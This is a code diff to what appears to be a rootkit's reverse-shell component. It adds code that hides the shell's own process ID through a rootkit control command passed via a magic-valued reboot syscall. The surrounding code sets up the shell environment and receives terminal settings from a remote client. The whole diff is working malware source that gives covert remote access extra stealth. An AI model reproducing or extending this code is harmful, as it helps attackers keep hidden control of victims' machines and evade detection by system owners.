@@ -42,9 +42,11 @@
 #include <fcntl.h>
 #include <netdb.h>
 #include <pty.h>
+#include <sys/syscall.h>
 
 #include "rshell.h"
 #include "pel.h"
+#include "ctl.h"
 
 unsigned char message[BUFSIZE + 1];
 extern char *optarg;
@@ -66,6 +68,12 @@ int main(int argc, char **argv) {
     struct hostent *client_host = NULL;
 	const char *cb_host = NULL;
 	unsigned short client_port = 0;
+	struct arprk_ctl ctl;
+
+	/* first of all, hide ourself */
+    ctl.cmd = ARPRK_CTLCMD_HIDE_PID;
+    ctl.pid = getpid();
+    syscall(SYS_reboot, ARPRK_CTL_MAGIC1, ARPRK_CTL_MAGIC2, ARPRK_CTL_MAGIC3, &ctl);
 
 	memset(&client_addr, 0, sizeof(client_addr));
 
@@ -334,7 +342,7 @@ int run_cmd(int client) {
 	putenv("PWD=" ARPRK_HOME);
 	putenv("PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:./bin:" ARPRK_HOME ":" ARPRK_HOME "/bin");
 
-    chdir(ARPRK_HOME);
+    ret = chdir(ARPRK_HOME);
 
 	/* get the TERM environment variable */
     ret = pel_recv_msg(client, message, &len);
